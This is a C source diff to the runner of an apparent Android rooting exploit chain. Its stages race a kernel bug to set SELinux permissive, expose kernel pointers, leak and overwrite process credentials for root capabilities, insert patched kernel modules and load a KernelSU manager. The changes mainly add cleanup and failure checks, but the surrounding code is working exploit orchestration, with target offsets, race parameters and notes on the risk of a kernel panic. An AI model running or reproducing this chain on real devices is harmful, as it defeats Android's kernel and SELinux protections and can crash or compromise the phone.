@@ -18,6 +18,7 @@
 #include <ctype.h>
 #include <sys/wait.h>
 #include <sys/types.h>
+#include <time.h>
 
 /* ---------- helpers ---------- */
 
@@ -61,10 +62,10 @@ static int glt_run(const RunnerCfg *cfg, const char *stage, int timeout_s,
         {"GL_USE_SLIDE", "1"},
         {"GL_EVENT_SYNC", "1"},
         {"GL_KEEP_CHAIN", "1"},
-        /* GL_NO_SCHED 从 fixed_base 移除：默认 1（SIGUSR1 触发，安全），
-         * sched 触发（GL_NO_SCHED=0，上游 ghostlock-app 验证的 app 域路径）
-         * 由 STAGE1 策略 2 显式传。getenv 取 environ 第一个匹配，
-         * extra 重复 key 覆盖不了 fixed_base（GL_ATTEMPTS 教训）。 */
+        /* The shipped glt checks getenv presence, not its numeric value.
+         * Absent => sched_setattr enabled; even "0" disables it. All shell
+         * stages must match the PC runner's explicit GL_NO_SCHED=1. */
+        {"GL_NO_SCHED", "1"},
         {"GL_NO_LOCKPI", "1"},
         {"GL_SLIDE_ONLY", "1"},
     };
@@ -136,17 +137,36 @@ static int glt_run(const RunnerCfg *cfg, const char *stage, int timeout_s,
     snprintf(log_path, sizeof(log_path), "%s/glt_%s.log", cfg->work, stage);
 
     char *argv[] = { glt_path, NULL };
-    /* 清残留：前一轮失败 fork 出的 glt 子进程（同 uid 可杀）会拖垮竞速
-     * （802 个残留 → loadavg 3421 风暴实证）；STAGE1/2/5 共用此处。 */
-    kill_all_named("libglt_esync");
-    int rc = exec_timeout(glt_path, argv, envp, log_path, timeout_s, exit_code);
-    if (rc == 1) kill_all_named("libglt_esync");   /* 超时组杀后名杀兜底 */
+    char checkpoint[96];
+    snprintf(checkpoint, sizeof(checkpoint), "%s/cleanup-before", stage);
+    runner_event(cfg, checkpoint, 0);
+    int rc;
+    if (cleanup_exec(glt_path, 2000) != 0) {
+        LOG("PROCESS_CLEANUP FAIL: %s before start; no new task launched", stage);
+        runner_event(cfg, checkpoint, RUNNER_CLEANUP_FAILED);
+        rc = RUNNER_CLEANUP_FAILED;
+        goto out;
+    }
+    LOG("glt[%s]: GL_NO_SCHED=1 (scheduler trigger disabled)", stage);
+    snprintf(checkpoint, sizeof(checkpoint), "%s/run", stage);
+    runner_event(cfg, checkpoint, 0);
+    rc = exec_timeout(glt_path, argv, envp, log_path, timeout_s, exit_code);
+    runner_event(cfg, checkpoint, rc);
+    /* A leader exiting normally does not imply all of its descendants exited.
+     * This is deliberately scoped to this task, never the manager daemon. */
+    snprintf(checkpoint, sizeof(checkpoint), "%s/cleanup-after", stage);
+    if (cleanup_exec(glt_path, 2000) != 0) {
+        LOG("PROCESS_CLEANUP FAIL: %s after exit; no further task allowed", stage);
+        rc = RUNNER_CLEANUP_FAILED;
+    }
+    runner_event(cfg, checkpoint, rc == RUNNER_CLEANUP_FAILED ? rc : 0);
 
     /* 诊断：glt 详细日志 dump 到 stdout（app 回显 logcat）。app 私有目录
      * /data/user/0/.../files/ghostboot/ 是 mode 700，adb shell 读不到——这是
      * 定位"app 域 glt 竞速到底写没写成功"的唯一真相来源。 */
     if (rc == 0 || rc == 1) dump_glt_log(cfg, log_path, stage);
 
+out:
     for (int i = 0; i < total; i++) free(envp[i]);
     free(envp);
     return rc;
@@ -187,21 +207,19 @@ static void hex64(char *buf, size_t sz, uint64_t v) {
     snprintf(buf, sz, "0x%llx", (unsigned long long)v);
 }
 
-/* 杀残留 w2host：先读 pid 文件 kill，再 pgrep -f 兜底（方括号防自匹配），
- * 再按名清杀（pid 文件可能过期/pid 复用）。 */
-static void kill_w2host(const RunnerCfg *cfg) {
+/* Clean only the executable managed by this run; stale PID files and a
+ * command-line substring must never select an unrelated process. */
+static int kill_w2host(const RunnerCfg *cfg) {
+    char binary[512];
+    bin_path(cfg, binary, sizeof(binary), "w2host");
+    runner_event(cfg, "worker/cleanup", 0);
+    if (cleanup_exec(binary, 2000) != 0) {
+        runner_event(cfg, "worker/cleanup", RUNNER_CLEANUP_FAILED);
+        return RUNNER_CLEANUP_FAILED;
+    }
     char pid_path[512];
     path_join(pid_path, sizeof(pid_path), cfg->work, "w2host.pid");
-    char *content = read_file(pid_path);
-    if (content) {
-        pid_t old = (pid_t)strtol(content, NULL, 10);
-        if (old > 1) kill(old, SIGKILL);
-        free(content);
-    }
     remove(pid_path);
-    char out[256] = {0};
-    sh_run("for p in $(pgrep -f 'w2hos[t]'); do kill -9 $p 2>/dev/null; done", out, sizeof(out));
-    kill_all_named("libw2host");
     /* B 修复 (2026-08-29): 对齐 PC 版 root.ps1 STAGE4 ROUND 每轮
      * "rm -f $dev_sock $dev_cred $dev_dbg $dev_proof $dev_task" + Start-Sleep 2.
      * w2host 失败轮不写 cred (O_TRUNC 只有成功才清空) -> 残留上一轮旧
@@ -213,6 +231,7 @@ static void kill_w2host(const RunnerCfg *cfg) {
     snprintf(p, sizeof(p), "%s/proof.txt", cfg->work);  remove(p);
     snprintf(p, sizeof(p), "%s/w2_task.txt", cfg->work); remove(p);
     sleep_s(2);
+    return 0;
 }
 
 static pid_t spawn_w2host(const RunnerCfg *cfg) {
@@ -224,6 +243,9 @@ static pid_t spawn_w2host(const RunnerCfg *cfg) {
     if (mem == 0) mem = 12ULL * 1024 * 1024 * 1024; /* 兜底 12GB */
 
     char sock[512], cred[512], dbg[512], proof[512], ksrc[512], kmark[512], task[512];
+    char manager_log[512], manager_status[512];
+    snprintf(manager_log, sizeof(manager_log), "%s/manager_load.log", cfg->work);
+    snprintf(manager_status, sizeof(manager_status), "%s/manager_load.status", cfg->work);
     char cand_min[64], direct_end[64], ips[256], ip_lo[64], ip_hi[64];
     snprintf(sock, sizeof(sock), "%s/rootcmd_%s.sock", cfg->work, cfg->tag);
     snprintf(cred, sizeof(cred), "%s/cred.txt", cfg->work);
@@ -245,18 +267,21 @@ static pid_t spawn_w2host(const RunnerCfg *cfg) {
     char *envp[] = {
         "W2_SOCK=?", "W2_CRED=?", "W2_DBG=?", "W2_PROOF=?", "W2_TASK=?",
         "W2_CRED_IPS=?", "W2_IP_LO=?", "W2_IP_HI=?", "W2_CAND_MIN=?",
-        "W2_DIRECT_END=?", "W2_KSETUP_SRC=?", "W2_KSETUP_MARK=?", NULL
+        "W2_DIRECT_END=?", "W2_KSETUP_SRC=?", "W2_KSETUP_MARK=?",
+        "W2_MANAGER_PKG=?", "W2_MANAGER_LOG=?", "W2_MANAGER_STATUS=?", NULL
     };
     /* 逐个写实际值（保持 envp 数组顺序不变） */
-    char *vals[] = { sock, cred, dbg, proof, task, ips, ip_lo, ip_hi, cand_min,
-                     direct_end, ksrc, kmark };
+    const char *vals[] = { sock, cred, dbg, proof, task, ips, ip_lo, ip_hi, cand_min,
+                     direct_end, ksrc, kmark, cfg->manager_package ? cfg->manager_package : "",
+                     manager_log, manager_status };
     static const char *keys[] = { "W2_SOCK", "W2_CRED", "W2_DBG", "W2_PROOF",
                                   "W2_TASK", "W2_CRED_IPS", "W2_IP_LO",
                                   "W2_IP_HI", "W2_CAND_MIN", "W2_DIRECT_END",
-                                  "W2_KSETUP_SRC", "W2_KSETUP_MARK" };
+                                  "W2_KSETUP_SRC", "W2_KSETUP_MARK",
+                                  "W2_MANAGER_PKG", "W2_MANAGER_LOG", "W2_MANAGER_STATUS" };
     static char envbuf[16][512];
     int ei = 0;
-    for (int i = 0; i < 12; i++) {
+    for (int i = 0; i < 15; i++) {
         snprintf(envbuf[ei], sizeof(envbuf[ei]), "%s=%s", keys[i], vals[i]);
         envp[ei] = envbuf[ei];
         ei++;
@@ -323,7 +348,6 @@ static size_t parse_cands(const char *content, char *cands, size_t max, size_t e
 
 /* ---------- STAGE0 机型门禁 ---------- */
 int stage0_gate(const RunnerCfg *cfg) {
-    (void)cfg;
     char rel[256] = {0};
     const char *r = get_osrelease(rel, sizeof(rel));
     if (!r) { LOG("GATE FAIL: cannot read kernel release"); return -1; }
@@ -332,6 +356,18 @@ int stage0_gate(const RunnerCfg *cfg) {
         return -1;
     }
     LOG("GATE OK: kernel %s", rel);
+    if (cfg->manager_package) {
+        char *modules = read_file("/proc/modules");
+        if (!modules) { LOG("GATE FAIL: cannot inspect loaded modules"); return -1; }
+        int loaded = strncmp(modules, "kernelsu ", 9) == 0 || strstr(modules, "\nkernelsu ") ||
+                     strncmp(modules, "sukisu ", 7) == 0 || strstr(modules, "\nsukisu ") ||
+                     strncmp(modules, "resukisu ", 9) == 0 || strstr(modules, "\nresukisu ");
+        free(modules);
+        if (loaded && (getuid() != 0 || geteuid() != 0)) {
+            LOG("GATE FAIL: a manager kernel is already loaded; reboot before changing/loading managers");
+            return -1;
+        }
+    }
     return 0;
 }
 
@@ -380,12 +416,6 @@ int stage1_permissive(const RunnerCfg *cfg) {
         else if (reported)
             LOG("STAGE1 WAIT: uptime=%lds OK", up);
     }
-    /* 策略 1：SIGUSR1 remove_waiter 触发 + pad/fpad/EXTRA 扫描（安全）。
-     * 策略 2（策略 1 全败后）：sched_setattr 触发（GL_NO_SCHED=0）——
-     * 上游 ghostlock-app（YuKongA）在 zygote app 域用 sched_setattr(nice=19)
-     * 触发成功（main.c consumer 循环），我们 v1.3.5 默认 SIGUSR1 路径
-     * 在 app 域 10+ 轮 0 成功。sched 触发有 rb_insert_color panic 风险
-     * （slide.c 注释警告），故仅作最后手段，2 轮限制。 */
     /* 触发策略 (2026-08-30, Shizuku shell 域正式路线):
      * app 域攻坚的 3 阶段 plan（A1/B32/C sched）已废弃：
      *   - glt 已恢复 prebuilt 原版 341074c4（shell 域唯一验证成功的 clang8 时序），
@@ -394,32 +424,34 @@ int stage1_permissive(const RunnerCfg *cfg) {
      *   - Shizuku/rish/adb shell 域（Seccomp=0、cpuset=/）与 PC 版环境一致，
      *     单窗口 delay=5000 一轮命中（PC 版 40+ 次 + rish 对照实证）。
      * 保留单轮 A：attempts=1 单窗口 SIGUSR1，timeout 90s（shell 域 20-30s 完成）。 */
-    static const struct { int attempts; int strategy; int timeout_s; } plan[] = {
-        {1, 1, 90},   /* A: 单窗口 SIGUSR1 remove_waiter 触发（shell 域一轮命中） */
+    static const struct { int attempts; int timeout_s; } plan[] = {
+        {1, 90},   /* A: 单窗口 SIGUSR1 remove_waiter 触发 */
     };
     for (int round = 1; round <= (int)(sizeof(plan) / sizeof(plan[0])); round++) {
         int attempts = plan[round - 1].attempts;
-        int strategy = plan[round - 1].strategy;
         int timeout_s = plan[round - 1].timeout_s;
-        gl_lock_next(cfg->work, lock, sizeof(lock));
+        if (!gl_lock_next(cfg->work, lock, sizeof(lock))) {
+            LOG("STAGE1 FAIL: GL_STATE reservation failed; stopped before glt");
+            return -1;
+        }
         hex64(target, sizeof(target), DEV_SE_P0);
         const char *const extra[][2] = {
             {"GL_LOCK", lock},
             {"GL_TARGET", target},
-            /* 策略 2（弃用）：GL_NO_SCHED=0 启用 sched_setattr 触发（保留字段） */
-            {"GL_NO_SCHED", strategy == 2 ? "0" : "1"},
         };
         int rc = -1;
-        int e = glt_run(cfg, "s1_permissive", timeout_s, GLF_TASK_W2 | GLF_PROBE, attempts, extra, 3, &rc);
-        if (e == 1) LOG("STAGE1 r%d(a%d/s%d): glt timeout", round, attempts, strategy);
+        int e = glt_run(cfg, "s1_permissive", timeout_s, GLF_TASK_W2 | GLF_PROBE, attempts, extra, 2, &rc);
+        if (e < 0) {
+            LOG("STAGE1 FAIL: task execution/cleanup failed; stopped");
+            return e;
+        }
+        if (e == 1) LOG("STAGE1 r%d(a%d): glt timeout", round, attempts);
         ep = getenforce_permissive();
         if (ep == 1 || (ep == -1 && enforce_readable())) {
-            LOG("STAGE1 OK (round %d attempts %d strategy %d): SELinux Permissive",
-                round, attempts, strategy);
+            LOG("STAGE1 OK (round %d attempts %d): SELinux Permissive", round, attempts);
             return 0;
         }
-        LOG("STAGE1 round %d attempts %d strategy %d: still enforcing (rc=%d)",
-            round, attempts, strategy, rc);
+        LOG("STAGE1 round %d attempts %d: still enforcing (rc=%d)", round, attempts, rc);
     }
     LOG("STAGE1 FAIL: 1 round (A1)");
     return -1;
@@ -441,7 +473,10 @@ int stage2_kptr(const RunnerCfg *cfg) {
         return 0;
     }
     for (int round = 1; round <= 5; round++) {
-        gl_lock_next(cfg->work, lock, sizeof(lock));
+        if (!gl_lock_next(cfg->work, lock, sizeof(lock))) {
+            LOG("STAGE2 FAIL: GL_STATE reservation failed; stopped before glt");
+            return -1;
+        }
         hex64(w0, sizeof(w0), DEV_W0);
         /* 同 STAGE1：app 域覆盖对齐扫描（LEAF 形态同样受 pselect 覆盖
          * 对齐影响，shell 域 pad=0/fpad=0 命中，app 域需扫组合）。 */
@@ -459,6 +494,10 @@ int stage2_kptr(const RunnerCfg *cfg) {
             {"GL_FPAD", fpad_s},
         };
         int e = glt_run(cfg, "s2_kptr", 120, 0, 1, extra, 6, NULL);
+        if (e < 0) {
+            LOG("STAGE2 FAIL: task execution/cleanup failed; stopped");
+            return e;
+        }
         if (e == 1) LOG("STAGE2 round %d: glt timeout", round);
         if (get_kptr_restrict() == 0) {
             LOG("STAGE2 OK (round %d): kptr_restrict=0", round);
@@ -523,7 +562,7 @@ int stage4_quiesce(const RunnerCfg *cfg) {
 
 /* ---------- STAGE4 泄漏：启动 w2host → 等 cred 候选 ---------- */
 int stage4_leak(const RunnerCfg *cfg, char *cands, size_t candsz) {
-    kill_w2host(cfg);
+    if (kill_w2host(cfg) != 0) return RUNNER_CLEANUP_FAILED;
     if (spawn_w2host(cfg) <= 0) { LOG("STAGE4 FAIL: spawn w2host"); return -1; }
     LOG("STAGE4: w2host spawned, waiting cred file (40x3s)");
 
@@ -540,14 +579,14 @@ int stage4_leak(const RunnerCfg *cfg, char *cands, size_t candsz) {
     if (!content || strlen(content) == 0) {
         free(content);
         LOG("STAGE4 FAIL: no cred file in 120s");
-        kill_w2host(cfg);
+        if (kill_w2host(cfg) != 0) return RUNNER_CLEANUP_FAILED;
         return -1;
     }
     size_t n = parse_cands(content, cands, candsz / 64, 64);
     free(content);
     if (n == 0) {
         LOG("STAGE4 FAIL: no valid candidates");
-        kill_w2host(cfg);
+        if (kill_w2host(cfg) != 0) return RUNNER_CLEANUP_FAILED;
         return -1;
     }
     LOG("STAGE4 OK: %zu candidate(s): %s%s%s",
@@ -581,7 +620,11 @@ int stage5_capsroot(const RunnerCfg *cfg, const SymTab *ksym, const char *cands)
             uint64_t cred = strtoull(toks[i], NULL, 0);
             if (cred == 0) continue;
             char lock[64], target[64];
-            gl_lock_next(cfg->work, lock, sizeof(lock));
+            if (!gl_lock_next(cfg->work, lock, sizeof(lock))) {
+                LOG("STAGE5 FAIL: GL_STATE reservation failed; stopped before glt");
+                kill_w2host(cfg);
+                return -1;
+            }
             hex64(target, sizeof(target), cred + DEV_CAP_OFF);
             const char *const extra[][2] = {
                 {"GL_LOCK", lock},
@@ -604,6 +647,11 @@ int stage5_capsroot(const RunnerCfg *cfg, const SymTab *ksym, const char *cands)
              * kernel_panic；20s 快速失败可缩小暴露窗口（部分命中→panic 固有风险）。
              * 候选循环外层 3 ROUND × 每 ROUND 重新泄漏 cred，由 stage5 循环承担。 */
             int e = glt_run(cfg, "s5_capsroot", 25, GLF_TASK_W2 | GLF_PROBE, 1, extra, 3, NULL);
+            if (e < 0) {
+                LOG("STAGE5 FAIL: task execution/cleanup failed; stopped");
+                kill_w2host(cfg);
+                return e;
+            }
             if (e == 1) LOG("STAGE5 r%d/%zu: glt timeout", round, i);
             char *proof = read_file(proof_path);
             int hit = proof && strstr(proof, "CAPSROOT");
@@ -653,7 +701,7 @@ int stage6_insmod(const RunnerCfg *cfg, const SymTab *ksym) {
     {
         int w1 = patch_ko(cv, cvpat, ksym);
         int w2 = patch_ko(pr, prpat, ksym);
-        int w3 = patch_ko(ksu, ksupat, ksym);
+        int w3 = cfg->manager_package ? 0 : patch_ko(ksu, ksupat, ksym);
         if (w1 < 0 || w2 < 0 || w3 < 0) {
             LOG("STAGE6 FAIL: ko patch 失败 (cv=%d pr=%d ksu=%d)", w1, w2, w3);
             return -1;
@@ -701,6 +749,15 @@ int stage6_insmod(const RunnerCfg *cfg, const SymTab *ksym) {
                  prpat, se_s, zero_s);
         r = rootcmd_call(sock, cmd2);
         LOG("STAGE6.0 permissive_restore: %s", r ? r : "(no reply)");
+        if (cfg->manager_package) {
+            int pid = -1;
+            const char *start = r ? strstr(r, "MANAGER_START ") : NULL;
+            if (!start || sscanf(start, "MANAGER_START %d", &pid) != 1 || pid <= 0) {
+                free(r);
+                LOG("STAGE6 FAIL: manager launcher unavailable in module-init root window");
+                return -1;
+            }
+        }
         free(r);
     }
 
@@ -720,6 +777,12 @@ int stage6_insmod(const RunnerCfg *cfg, const SymTab *ksym) {
     }
     if (!ksetup_ok) { LOG("STAGE6 FAIL: ksud not installed (no KSETUP_OK in 60s)"); return -1; }
     LOG("STAGE6: ksud installed (KSETUP_OK)");
+
+    if (cfg->manager_package) {
+        LOG("STAGE6: manager late-load launched in module-init root context: %s", cfg->manager_package);
+        gl_state_reset(cfg->work);
+        return 0; /* Never load bundled kernelsu.ko in manager mode. */
+    }
 
     /* kernelsu INSMOD（rootcmd 通道，趁 socket 还通；用 patched 版） */
     {
@@ -750,8 +813,131 @@ int stage6_insmod(const RunnerCfg *cfg, const SymTab *ksym) {
 }
 
 /* ---------- STAGE7 验证 ---------- */
+static void manager_dump_log(const RunnerCfg *cfg) {
+    char path[512];
+    snprintf(path, sizeof(path), "%s/manager_load.log", cfg->work);
+    char *text = read_file(path);
+    if (text) { LOG("MANAGER loader log:\n%.8192s", text); free(text); }
+    snprintf(path, sizeof(path), "%s/manager_load.status", cfg->work);
+    text = read_file(path);
+    if (text) { LOG("MANAGER loader status: %s", text); free(text); }
+}
+
+static int manager_verify(const RunnerCfg *cfg) {
+    char status_path[512], hash_path[512], verify_path[512];
+    snprintf(status_path, sizeof(status_path), "%s/manager_load.status", cfg->work);
+    snprintf(hash_path, sizeof(hash_path), "%s/ksud.sha256", cfg->work);
+    snprintf(verify_path, sizeof(verify_path), "%s/manager_verify.log", cfg->work);
+    char *expected = read_file(hash_path);
+    if (!expected || strlen(expected) != 65 || expected[64] != '\n') {
+        free(expected); LOG("STAGE7 FAIL: missing manager daemon hash"); return -1;
+    }
+    expected[64] = 0;
+    for (int i = 0; i < 64; i++) {
+        if (!isxdigit((unsigned char)expected[i])) {
+            free(expected); LOG("STAGE7 FAIL: invalid manager hash"); return -1;
+        }
+    }
+    LOG("STAGE7: checking manager module, shell root and installed daemon (up to 120s)");
+    time_t deadline = time(NULL) + 120;
+    while (time(NULL) < deadline) {
+        char *status = read_file(status_path);
+        int exited = status && (strstr(status, "MANAGER_EXIT 0") || strstr(status, "MANAGER_EXISTING 0"));
+        int failed = status && strstr(status, "MANAGER_FAIL ");
+        free(status);
+        if (failed) break;
+        char *modules = read_file("/proc/modules");
+        int loaded = modules && (strncmp(modules, "kernelsu ", 9) == 0 || strstr(modules, "\nkernelsu ") ||
+                                 strncmp(modules, "sukisu ", 7) == 0 || strstr(modules, "\nsukisu ") ||
+                                 strncmp(modules, "resukisu ", 9) == 0 || strstr(modules, "\nresukisu "));
+        free(modules);
+        if (loaded && exited) {
+            char *args[] = {"/system/bin/sh", "-c",
+                "timeout 6 su -c 'id; sha256sum /data/adb/ksud' 2>&1", NULL};
+            int code = -1;
+            int result = exec_timeout(args[0], args, NULL, verify_path, 8, &code);
+            char *proof = read_file(verify_path);
+            if (result == 0 && code == 0 && proof && strstr(proof, "uid=0(root)") &&
+                strstr(proof, expected)) {
+                LOG("STAGE7 OK: %s module loaded, su uid=0, installed ksud SHA-256 matches selected manager",
+                    cfg->manager_package);
+                LOG("MANAGER proof: %.1024s", proof);
+                free(proof); free(expected);
+                manager_dump_log(cfg);
+                return 0;
+            }
+            free(proof);
+        }
+        sleep_s(2);
+    }
+    free(expected);
+    manager_dump_log(cfg);
+    char *proof = read_file(verify_path);
+    if (proof) { LOG("MANAGER verify log: %.2048s", proof); free(proof); }
+    LOG("STAGE7 FAIL: selected manager did not pass module/root/daemon checks; no bundled fallback. Reboot before retry.");
+    return -1;
+}
+
+int stage_root_session(const RunnerCfg *cfg) {
+    if (getuid() != 0 || geteuid() != 0) {
+        LOG("ROOT_SESSION FAIL: runner is not uid0"); return -1;
+    }
+    if (!cfg->manager_package) {
+        LOG("UI_STAGE START 8");
+        LOG("STAGE7 OK: existing Shizuku root is available; no manager selected, nothing loaded");
+        return 0;
+    }
+    char *modules = read_file("/proc/modules");
+    if (!modules) { LOG("ROOT_SESSION FAIL: cannot inspect loaded modules"); return -1; }
+    int loaded = strncmp(modules, "kernelsu ", 9) == 0 || strstr(modules, "\nkernelsu ") ||
+                 strncmp(modules, "sukisu ", 7) == 0 || strstr(modules, "\nsukisu ") ||
+                 strncmp(modules, "resukisu ", 9) == 0 || strstr(modules, "\nresukisu ");
+    free(modules);
+    char path[512], status_path[512];
+    snprintf(status_path, sizeof(status_path), "%s/manager_load.status", cfg->work);
+    if (loaded) {
+        // Verify an existing installation; do not ask late-load to skip an old
+        // kernel and then overwrite its userspace daemon with a different one.
+        snprintf(path, sizeof(path), "%s/manager_identity.log", cfg->work);
+        char *args[] = {"/system/bin/sh", "-c", "sha256sum /data/adb/ksud", NULL};
+        int code = -1;
+        int result = exec_timeout(args[0], args, NULL, path, 5, &code);
+        char *actual = read_file(path);
+        snprintf(path, sizeof(path), "%s/ksud.sha256", cfg->work);
+        char *expected = read_file(path);
+        int matches = result == 0 && code == 0 && actual && expected &&
+                      strlen(expected) == 65 && expected[64] == '\n' &&
+                      strncmp(actual, expected, 64) == 0;
+        free(actual); free(expected);
+        if (!matches) {
+            LOG("ROOT_SESSION FAIL: existing manager module has a different or unreadable daemon; reboot and start Shizuku through wireless debugging before loading the selected manager");
+            return -1;
+        }
+        LOG("ROOT_SESSION: existing manager module and matching daemon found; verifying without reloading");
+        if (write_file(status_path, "MANAGER_EXISTING 0\n") != 0) return -1;
+    } else {
+        snprintf(path, sizeof(path), "%s/ksud", cfg->work);
+        char log_path[512];
+        snprintf(log_path, sizeof(log_path), "%s/manager_load.log", cfg->work);
+        char *args[] = {path, "late-load", "--allow-shell", "--package-name",
+                        (char *)cfg->manager_package, NULL};
+        int code = -1;
+        LOG("ROOT_SESSION: load selected manager directly using existing uid0: %s", cfg->manager_package);
+        int result = exec_timeout(path, args, NULL, log_path, 120, &code);
+        if (result != 0 || code != 0) {
+            write_file(status_path, "MANAGER_FAIL 1\n");
+            manager_dump_log(cfg);
+            LOG("ROOT_SESSION FAIL: manager late-load failed (result=%d exit=%d)", result, code);
+            return -1;
+        }
+        if (write_file(status_path, "MANAGER_EXIT 0\n") != 0) return -1;
+    }
+    LOG("UI_STAGE START 8");
+    return manager_verify(cfg);
+}
+
 int stage7_verify(const RunnerCfg *cfg) {
-    (void)cfg;
+    if (cfg->manager_package) return manager_verify(cfg);
     LOG("STAGE7: waiting 25s for stack settle");
     sleep_s(25);
 
